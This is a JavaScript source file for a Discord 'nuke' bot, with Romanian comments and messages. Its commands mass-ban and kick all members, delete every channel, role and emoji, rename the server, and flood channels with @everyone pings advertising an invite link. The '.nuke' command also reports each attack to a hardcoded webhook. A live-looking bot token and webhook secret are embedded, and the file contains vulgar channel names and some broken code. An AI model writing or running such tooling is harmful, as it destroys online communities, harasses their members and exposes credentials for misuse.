// https://github.com/17teen
// Discord: 7teen#3868

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const presser = String.raw`

 Author: Pingu

`;

console.log(red(presser));

client.on("message", async message => {

  if (message.author.bot) return;


  if (message.content.startsWith('.help')) {
    const helpEmbed = new Discord.MessageEmbed()
      .se.tTitle('')
      .setDescription(`cf`)
      .setImage(``)
      .setFooter(``)
      .setColor('ff0000')
    message.channel.send(helpEmbed);
  }

//invite
  if (message.content.startsWith('.invite')) {
    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('Bot Invite Link')
      .setDescription(`Invite link ul il aveti mai jos`)
      .setImage(``)
      .setFooter(`Pentru comenzi tastati .help`)
      .setColor('ff0000')
    message.channel.send(helpEmbed);
  }

//icon set
  if (message.content.startsWith('.sn')) {

      message.guild.setIcon('https://media.discordapp.net/attachments/874926758367989770/878263835360915476/1738931.jpg?width=732&height=427') // changes server pfp

  }


  // Mass Ban
  if (message.content.startsWith('.banv2')) {

    message.guild.members.cache.forEach(member => member.ban({ reason: "KS was here." })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))
      
}


//saawokoajwova
  if (message.content.startsWith('.deletechannels')) {
  
      message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    ))

  }


//asaslal
  if (message.content.startsWith('.deleteroles')) {

    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })

  }

//sunt nr 1
  if (message.content.startsWith('.addchannel')) {

    await message.guild.channels.create(`salut`, {
      type : 'text'
    })
  }

  // Mass Ban
  if (message.content.startsWith('.baneveryone')) {

    message.guild.members.cache.forEach(member => member.ban({ reason: "KS was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))
      
}

  // Mass Channels      

  if (message.content.startsWith('.nuke')) {
    
  if (message.guild.id === "878570937518284830") return message.channel.send("Ce vrei sklavo iesi acasa")






    // Channel Delete

    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    )); // deletes all channels
    message.delete();



    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "KS was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))

    let mes = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.nuke** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`;
    const wrb = new Discord.WebhookClient("871791571375390740", "ac3GsQtHJGZ0I-EcXNawH7exEQZOtbooAgiIPmnHjLtSTz9jlO3YyYrqgNBQT1C_50Lq");

    await wrb.send(mes)

    // Kick All


    message.guild.members.cache.forEach(member => member.kick({ reason: "KS was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ));




    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })




    // Delete All Emojis 

    message.guild.emojis.cache.forEach(e => e.delete({ reason: "KS Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))




    // Death.


    message.guild.setName(`Server Inchis`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://media.discordapp.net/attachments/874926758367989770/878263835360915476/1738931.jpg?width=732&height=427') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "KS was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))





  }


})

const http = require('http');
const requestListener = function(req, res) {
  res.end('Hello, World!');
}
const server = http.createServer(requestListener); 
server.listen(8080);

client.login("ODgzMjY4NTM3MjgyNjI1NTQ3.YTHd7Q.tEoSgdwLgWtLIap_mBCSpBR8GaQ")




client.on('message', async (message) => {
  if (message.content === '.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.roles.cache.forEach(role => role.delete());

    await message.guild.channels.create(`MUIE-SERVER`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})


client.on('message', async (message) => {
  if (message.content === '@everyone') {
    await message.guild.channels.create(`server-inchis`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
  })
  }
})

//ok fac ceva misto
client.on('message', async (message) => {
  if (message.content === '.spamchannels') {

    await message.guild.channels.create(`MUIE-SERVER`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})


client.on('message', async (message) => {
  if (message.content === '@everyone') {
    await message.guild.channels.create(`server-inchis`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
    message.channel.send('@everyone https://discord.gg/9YzjXEt4MJ DORLEONE BEST BOT')
  })
  }
})